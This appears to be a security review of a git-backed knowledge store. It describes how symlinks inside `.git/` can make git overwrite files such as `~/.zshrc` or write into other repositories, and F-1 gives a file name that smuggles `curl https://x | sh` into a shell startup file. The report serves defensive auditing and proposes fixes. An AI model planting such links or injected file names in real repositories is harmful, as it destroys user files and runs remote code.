# security findings for 2026-11-08-003-knowledge-store-entries-as-markdown-with

## Findings
- F-1 · defect · src/modules/knowledge/repo.ts:123 · Someone who drops a repository under `knowledge/` can still get the store to write outside it, and through that get a program run. `refuseForeign` (OWN_LAYOUT) checks only that `.git` is a folder. `checkRepoConfig` checks only `config`, `commondir`, `config.worktree` and `objects/info/alternates`. Nothing else inside `.git/` is checked, so `.git/COMMIT_EDITMSG` may be a link. On every `commitPaths` (repo.ts:800) git's `prepare_to_commit` opens that file with `fopen_for_writing`, which is `fopen(path, "w")`. The call happens even with `-m`, follows the link, truncates the target and writes the commit message into it. Who: the dropper. With what: `.git/COMMIT_EDITMSG` linked to `~/.zshrc`, or to any file the person can write. What they get: that file destroyed on the person's next write, accept or adopt in the repository. It becomes a program run through `adopt`. The adopt message lists the status paths verbatim (store.ts:922; `status -z` names are raw), and a non-entry file is committed "as it is". A file named `entries/a\ncurl https://x | sh\n` therefore puts that command on its own line in `.zshrc`. The message also carries the person's name nowhere, but the same link class covers it (F-2). Reasoned from git's source (builtin/commit.c `prepare_to_commit`, wrapper.c `fopen_for_writing`), not run. A possible fix: refuse any link under `.git/`. A bounded `lstat` walk covers it: the top-level names, `refs/`, `logs/`, `info/`, and `objects/` with its 256 fan-out folders.
- F-2 · defect · src/modules/knowledge/repo.ts:123 · Folders inside `.git/` that are links make git write into another place. Who: the dropper. With what: `.git/refs` and `.git/objects` linked to another repository's `refs/` and `objects/`. What they get: the store's commit is built on that repository's HEAD tree (`commit --only`), and `refs/heads/main` is moved there through the `.lock` and rename. A knowledge commit then lands on the person's own project branch, which is the harm ADR 0024 names as its reason to refuse a gitfile. A second variant needs only `.git/logs/HEAD` (or `.git/logs`) as a link. `core.logallrefupdates=true` is on the allow list, so every commit appends a reflog line holding the person's name (author.ts:45) to a file the dropper chooses. That is personal data written outside the store, in a named risk area. Reasoned from git's files ref backend: the ref lock goes through leading links, and the reflog is opened with `O_APPEND|O_CREAT` and no `O_NOFOLLOW`. Not run. The same fix as F-1 closes it.
- F-3 · advisory · src/modules/knowledge/repo.ts:1070 · `dropKept` calls `rmSync` without `recursive`. A dropped folder at a valid `wizardingcode-kept-*.json` name makes it throw a non-`KnowledgeError` out of `revertInterrupted`. Every command on that repository then fails, and the CLI's per-repository catch rethrows it, so `list`, `rebuild` and `adopt` stop for all repositories. The effect is availability only.
- F-4 · advisory · src/modules/knowledge/index-store.ts:572 · `rebuildAll` keeps the index rows of a repository it now refuses, because its folder still exists. Entries of a repository refused for a dangerous configuration stay listed in the index. Nothing reads the index for an agent yet; it should be cleared or flagged before "knowledge for the agent" lands.

Round three checked against the current code:
- R3 F-1 (support folders) is closed. Verified from code: `supportPaths` and `ensureSupportFolders` are gone, `GIT_CONFIG_GLOBAL` is `/dev/null` (repo.ts:257, 274), and `init` gets `--template=` (repo.ts:598). `core.hooksPath` is the repository's `.git/config`, set only when a repository is given (repo.ts:304). probes/security-round-four.md runs a, b and c with no program run. My reading of `core.hooksPath=<repo>/.git/config`:
  - `checkRepoConfig` refuses a `.git/config` that is a folder or a link (`readRegularFile`, repo.ts:473).
  - A missing `.git/config` leaves the hooks path pointing at nothing, so git finds no hook and does not fall back to `.git/hooks`.
  - The three calls with no repository (`init`, `--version`, `config --global user.name`) run no hook.
  - A swap of `.git/config` for a folder of hooks between the check and the call needs a live process with write access to the data directory, which also holds the binary. I judge that outside the dropper model, by reasoning.
  - Of the rest of `.git/`: `info/attributes` and a work-tree `.gitattributes` cannot run a program, because no filter, diff or merge driver can be configured (reasoned). `info/exclude` and `shallow` only change what git sees. `hooks/` is overridden.
  - What is still open is links inside `.git/` (F-1, F-2), not configuration.
- R3 F-2 (link under entries/) is closed. Verified from code: `reachedByFolders` is in `stateOf` (repo.ts:1078), `undoStaged` (repo.ts:830, covering `restoreToHead` and `learnAliases`) and `restoreKept` (repo.ts:1063), and the probe's three variants leave the outside file. Other places a path reaches the disk:
  - Status paths in `adoptIn` reach `existsOnDisk` and `readRegularFile` without it (store.ts:847, 890). That only hashes an outside file into the record.
  - Rewrites are limited to `entries/<slug>.md` directly (`ENTRY_FILE`), whose folder `refuseForeign` checks.
  - git's own `reset`, `restore` and `add` refuse paths beyond a link (reasoned).
- R3 F-3 is closed. Verified: the record and the kept bytes go through `readRegularFile` with a 64 MiB cap, and `existsOnDisk` comes first. A FIFO is refused by `isFile`.
- R3 F-4 is closed. Verified: `objects/info/alternates` is in `REFUSED_FILES` (repo.ts:431).
- CLI and `rebuildAll` catch: only `KnowledgeError` with code `invalid` is caught. `git`, `locked`, schema and other errors still stop the command, and the exit code is 1 when any repository was refused. Nothing that should stop the command gets through (verified from code). The exceptions are F-3, which is the reverse case, and F-4.
- data-migration: the `DELETE FROM meta` of three withdrawn-module keys in migration 6 runs after the backup that precedes migration 6, and its reason is stated in ADR 0024. The round-two advisories (an irreversible drop with a stated reason, backup rotation) stand.
- personal-data: the name goes into commits, entries and the index as before, with a synthetic `.invalid` email (author.ts:43-46). The only new exposure is F-2's reflog variant.
